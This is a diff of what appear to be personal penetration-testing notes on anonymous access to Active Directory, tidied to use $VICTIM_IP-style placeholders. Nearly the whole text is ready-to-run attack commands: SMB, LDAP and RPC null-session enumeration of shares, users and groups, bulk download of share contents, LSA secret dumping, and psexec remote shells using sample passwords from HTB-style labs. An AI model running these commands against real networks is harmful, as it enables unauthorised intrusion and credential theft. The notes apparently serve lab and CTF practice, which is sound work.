@@ -1,32 +1,37 @@
 #AD_anonymous_access
-# **SMB null session**
+# <span style="color:#FF5555">SMB null session</span>
+
+> [!info] Variables used below
+> - `$VICTIM_IP` – target machine's IP
+> - `$DC_IP` – Domain Controller's IP
+> - `$DOMAIN` – target domain name
 
 ```bash
-smbclient -L //$t -N     # List shares without creds
+smbclient -L //$VICTIM_IP -N     # List shares without creds
 
 #smbmap
-smbmap -H $t -u '' -p ''
+smbmap -H $VICTIM_IP -u '' -p ''
 
 # shares
-nxc smb $t -u '' -p '' --shares   
-nxc smb $t -u 'guest' -p '' --shares
+nxc smb $VICTIM_IP -u '' -p '' --shares   
+nxc smb $VICTIM_IP -u 'guest' -p '' --shares
    
 # users   
-nxc smb $t -u '' -p '' --users   
-nxc smb $t -u 'guest' -p '' --users
+nxc smb $VICTIM_IP -u '' -p '' --users   
+nxc smb $VICTIM_IP -u 'guest' -p '' --users
 
 # write all the files in your local system
 # EXCLUDE_FILTER : to exclude some shares, as some of shares contain rough/huge data
-nxc smb $t -u '' -p '' --shares -M spider_plus -o DOWNLOAD_FLAG=True EXCLUDE_FILTER='print$, ipc$'
+nxc smb $VICTIM_IP -u '' -p '' --shares -M spider_plus -o DOWNLOAD_FLAG=True EXCLUDE_FILTER='print$, ipc$'
 
 # for multiple ips
 nxc --verbose smb ./ips.txt -u corpmngr -p 'User4&*&*' --continue-on-success
 
 ## if the we found the credents of user which is local administrator then we can run command to dump the lsa
-nxc smb 192.168.98.30 -u john -p User1@#$%6 --lsa --verbose
+nxc smb $VICTIM_IP -u john -p User1@#$%6 --lsa --verbose
 
 # Connecting to the system if smb is Pwned!
-impacket-psexec active.htb/Administrator@Pass123123@192.168.98.12
+impacket-psexec $DOMAIN/Administrator@Pass123123@$VICTIM_IP
 
 # getting all smb files from folder
 recurse
@@ -40,19 +45,19 @@ mget *
 netexec smb dc01.vintage.htb -u P.Rosa -p Rosaisbest123 -k --shares
 ```
 
-# **LDAP anonymous bind**
+# <span style="color:#FF5555">LDAP anonymous bind</span>
 
 ```bash
-ldapsearch -x -H ldap://<IP> -s base namingcontexts
-nxc ldap <IP> -u '' -p '' -M ldap-checker
+ldapsearch -x -H ldap://$DC_IP -s base namingcontexts
+nxc ldap $DC_IP -u '' -p '' -M ldap-checker
 ```
 
-# **RPC null session**
+# <span style="color:#FF5555">RPC null session</span>
 checking for null sessions to get the usernames
 
 ```bash
-rpcclient <IP>
-rpcclient -U "" -N <IP>
+rpcclient $VICTIM_IP
+rpcclient -U "" -N $VICTIM_IP
 rpcclient $> enumdomusers
 rpcclient $> enumdomgroups
 rpcclient $> querygroupmem 0x200
